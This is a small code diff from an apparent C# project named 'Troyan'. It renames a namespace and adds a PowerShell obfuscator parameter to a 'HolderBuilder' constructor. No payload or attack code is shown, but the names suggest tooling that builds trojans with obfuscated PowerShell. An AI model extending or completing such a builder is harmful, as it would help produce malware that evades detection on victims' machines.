@@ -1,8 +1,8 @@
-namespace TroyanBuilder;
+namespace Troyan.Core;
 
 public sealed class HolderBuilder : CustomBuilder
 {
-    public HolderBuilder(TroyanBuildMode mode) : base(mode)
+    public HolderBuilder(TroyanBuildMode mode, IPowerShellObfuscator obfuscator) : base(mode, obfuscator)
     {
     }
 
